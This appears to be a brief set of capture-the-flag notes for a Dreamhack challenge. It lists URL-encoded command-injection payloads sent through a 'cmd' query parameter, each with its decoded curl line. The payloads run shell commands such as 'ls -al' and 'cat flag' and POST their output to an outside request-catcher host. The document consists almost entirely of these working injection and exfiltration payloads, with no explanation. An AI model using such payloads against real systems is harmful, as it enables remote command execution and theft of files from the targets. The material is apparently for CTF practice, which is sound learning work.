/?cmd=curl%20-X%20POST%20-d%20%22fizz=buzz%22%20https://fmechrr.request.dreamhack.games
curl -X POST -d "fizz=buzz" https://fmechrr.request.dreamhack.games

/?cmd=curl%20-X%20POST%20-d%20%22$(ls%20-al)%22%20https://fmechrr.request.dreamhack.games
curl -X POST "-d"$(cat flag) https://fmechrr.request.dreamhack.games

/?cmd=curl%20-X%20POST%20-d%20%22$(cat%20flag)%22%20https://fmechrr.request.dreamhack.games
curl -X POST "-d" $(cat flag) https://fmechrr.request.dreamhack.games
